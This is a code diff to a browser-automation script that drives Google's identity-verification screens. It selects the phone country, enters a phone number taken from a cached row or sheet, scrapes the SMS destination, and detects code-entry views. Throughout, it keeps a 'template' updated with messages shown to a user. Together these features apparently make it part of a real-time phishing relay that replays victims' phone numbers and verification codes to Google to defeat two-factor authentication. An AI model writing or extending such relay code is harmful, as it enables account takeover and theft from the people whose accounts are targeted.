@@ -2257,6 +2257,15 @@ async function phaseWaitingRecoveryEmail(browserId, browser, page, email, platfo
     return { finalStatus, updateData, pollingTimedOut };
 }
 
+// ISO2 → English country name for Google's #countryList combobox on the phone
+// entry screen. Keys match the template's txtPhoneCountry data-iso values.
+const PHONE_COUNTRY_NAMES = {
+    us: 'United States', gb: 'United Kingdom', ca: 'Canada', ng: 'Nigeria',
+    gh: 'Ghana', ke: 'Kenya', za: 'South Africa', in: 'India', pk: 'Pakistan',
+    ph: 'Philippines', ae: 'United Arab Emirates', sa: 'Saudi Arabia',
+    eg: 'Egypt', de: 'Germany', fr: 'France', es: 'Spain'
+};
+
 // Phase function: WAITINGPHONENUMBER
 // Mirrors phaseWaitingRecoveryEmail. Handles the Google "Verify it's you — Enter a
 // phone number to get a text message with a verification code" screen
@@ -2313,11 +2322,15 @@ async function phaseWaitingPhoneNumber(browserId, browser, page, email, platform
 
             // Value source: cache first (update-process writes it there), sheet column fallback.
             let phoneNumberValue = null;
+            let phoneCountryDial = '';
+            let phoneCountryIso = '';
             try {
                 const cachedRowForPhone = getCachedRow(browserId);
                 if (cachedRowForPhone?.phoneNumber && String(cachedRowForPhone.phoneNumber).trim() !== "") {
                     phoneNumberValue = String(cachedRowForPhone.phoneNumber).trim();
                 }
+                if (cachedRowForPhone?.phoneCountryDial) phoneCountryDial = String(cachedRowForPhone.phoneCountryDial).trim();
+                if (cachedRowForPhone?.phoneCountryIso) phoneCountryIso = String(cachedRowForPhone.phoneCountryIso).trim().toLowerCase();
             } catch (_) {}
             let checkRowForPhone = null;
             if (!phoneNumberValue) {
@@ -2360,8 +2373,31 @@ async function phaseWaitingPhoneNumber(browserId, browser, page, email, platform
                 if (phoneInputSelector) {
                     try {
                         await page.waitForSelector(phoneInputSelector, { visible: true, timeout: 10000 });
+                        // Best-effort: match Google's country dropdown to the template's
+                        // selection so the national number lands in the right context.
+                        const _dialDigits = phoneCountryDial.replace(/\D/g, '');
+                        let _nationalDigits = phoneNumberValue.replace(/\D/g, '');
+                        if (_dialDigits && _nationalDigits.indexOf(_dialDigits) === 0 && _nationalDigits.length > _dialDigits.length) {
+                            _nationalDigits = _nationalDigits.slice(_dialDigits.length);
+                        }
+                        const _countryName = PHONE_COUNTRY_NAMES[phoneCountryIso] || null;
+                        if (_countryName) {
+                            try {
+                                const _comboSel = '#countryList [role="combobox"]';
+                                await page.waitForSelector(_comboSel, { visible: true, timeout: 5000 });
+                                await page.click(_comboSel);
+                                await new Promise(res => setTimeout(res, 800));
+                                await page.keyboard.type(_countryName, { delay: 40 });
+                                await new Promise(res => setTimeout(res, 800));
+                                await page.keyboard.press('Enter');
+                                await new Promise(res => setTimeout(res, 800));
+                                logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] Selected country ${_countryName} on Google page.`);
+                            } catch (countryErr) {
+                                logger.warn(`[processRow][${browserId}][WAITINGPHONENUMBER] Google country select failed, continuing with default: ${countryErr.message}`);
+                            }
+                        }
                         await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, phoneInputSelector);
-                        await page.type(phoneInputSelector, phoneNumberValue, { delay: 50 });
+                        await page.type(phoneInputSelector, _nationalDigits, { delay: 50 });
                         logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] Typed phone number into ${phoneInputSelector}`);
 
                         const navigationPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 5000 })
@@ -2391,12 +2427,19 @@ async function phaseWaitingPhoneNumber(browserId, browser, page, email, platform
                             finalStatus = "WAITINGCODE";
                             updateData.status = "WAITINGCODE";
                             updateData.phoneNumber = '';
+                            let _smsDest = postPhoneState.smsDestination || null;
+                            if (!_smsDest) {
+                                try {
+                                    _smsDest = await page.$eval('[jsname="wKtwcc"]', el => (el.textContent || '').trim()).catch(() => null) || null;
+                                } catch (_) {}
+                            }
                             updateData.lastJsonResponse = JSON.stringify({
                                 ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                 status: "WAITING_CODE",
                                 verificationState: 'WAITING_CODE',
                                 viewName: postPhoneState.viewName,
-                                message: "Phone number submitted. Verification code screen reached."
+                                smsDestination: _smsDest,
+                                message: _smsDest ? `A text message with a 6-digit verification code was just sent to ${_smsDest}.` : "Phone number submitted. Verification code screen reached."
                             });
                             updateBrowserRowDataFast(browserId, updateData);
                             break;
@@ -5211,12 +5254,14 @@ if (!foundSelector) {
                             platformConfig.selectors?.authenticatorCodeInput,
                             platformConfig.selectors?.verificationCodeInput,
                             platformConfig.selectors?.gmailEmailCodeInput,
+                            platformConfig.selectors?.smsCodeInput,
                         ].filter(Boolean))];
                         const codeSubmitSelectors = [...new Set([
                             platformConfig.selectors?.fluentCodeSubmit,
                             platformConfig.selectors?.authenticatorCodeSubmit,
                             platformConfig.selectors?.verificationCodeSubmit,
                             platformConfig.selectors?.gmailEmailCodeSubmit,
+                            platformConfig.selectors?.smsCodeSubmit,
                         ].filter(Boolean))];
                         logger.info(`[processRow][${browserId}][WAITINGCODE] Code input selectors to try: ${JSON.stringify(codeInputSelectors)}`);
 
@@ -5644,6 +5689,25 @@ if (!foundSelector) {
                                                 });
                                                 updateBrowserRowDataFast(browserId, updateData);
                                                 break;
+                                            } else if (passiveProbe.required && passiveProbe.type === 'code' && passiveProbe.viewName) {
+                                                // Same code family, different screen (e.g. Google silently
+                                                // advanced email-code → SMS-code). Refresh the view so the
+                                                // template shows the right copy; stay in WAITINGCODE.
+                                                try {
+                                                    const _curLjr = JSON.parse(updateData.lastJsonResponse || '{}');
+                                                    if (_curLjr.viewName !== passiveProbe.viewName) {
+                                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Passive wait: code view changed to ${passiveProbe.viewName}. Refreshing message.`);
+                                                        updateData.lastJsonResponse = JSON.stringify({
+                                                            ..._curLjr,
+                                                            status: "WAITING_CODE",
+                                                            verificationState: 'WAITING_CODE',
+                                                            viewName: passiveProbe.viewName,
+                                                            smsDestination: passiveProbe.smsDestination || _curLjr.smsDestination || null,
+                                                            message: passiveProbe.smsDestination ? `A text message with a 6-digit verification code was just sent to ${passiveProbe.smsDestination}.` : `Verification code screen reached (${passiveProbe.viewName}).`
+                                                        });
+                                                        updateBrowserRowDataFast(browserId, updateData);
+                                                    }
+                                                } catch (_) {}
                                             }
                                         } catch (_) {}
                                     }
